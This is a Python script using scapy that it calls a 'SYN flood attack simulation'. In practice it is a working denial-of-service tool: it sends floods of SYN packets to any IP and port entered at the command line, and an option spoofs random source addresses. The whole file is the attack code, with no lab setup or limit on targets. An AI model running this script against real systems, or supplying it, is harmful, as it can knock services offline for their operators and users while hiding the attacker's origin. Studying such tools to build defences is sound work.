#!/usr/bin/env python3
"""
SYN Flood Attack Simulation
This script simulates a SYN flood attack by sending multiple SYN packets
to a target without completing the TCP handshake.
"""

import argparse
import sys
import time
import random
from scapy.all import IP, TCP, send, RandIP, RandShort

def syn_flood(target_ip, target_port, packets_count=100, interval=0.1, spoof_ip=False):
    """
    Send SYN packets to target to simulate a SYN flood attack.
    
    Args:
        target_ip: The target IP address
        target_port: The target port
        packets_count: Number of packets to send
        interval: Delay between packets
        spoof_ip: Whether to use random source IPs
    """
    print(f"Starting SYN flood attack simulation against {target_ip}:{target_port}")
    print(f"Sending {packets_count} packets with {interval}s interval")
    
    sent_count = 0
    
    for i in range(packets_count):
        try:
            if spoof_ip:
                source_ip = str(RandIP())
                source_port = RandShort()
            else:
                source_ip = None
                source_port = RandShort()
            
            ip = IP(dst=target_ip, src=source_ip) if source_ip else IP(dst=target_ip)
            
            tcp = TCP(sport=source_port, dport=target_port, flags="S", seq=RandShort(), window=RandShort())
            
            send(ip/tcp, verbose=0)
            sent_count += 1
            
            if i % 10 == 0:
                print(f"Sent {sent_count} packets...")
            
            time.sleep(interval)
            
        except KeyboardInterrupt:
            print("\nAttack simulation interrupted by user")
            break
        
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    print(f"\nSYN flood simulation completed. Sent {sent_count} packets.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood Attack Simulation Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of packets to send (default: 100)")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Interval between packets in seconds (default: 0.1)")
    parser.add_argument("-s", "--spoof", action="store_true", help="Use random source IP addresses")
    
    args = parser.parse_args()
    
    try:
        syn_flood(args.target, args.port, args.count, args.interval, args.spoof)
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)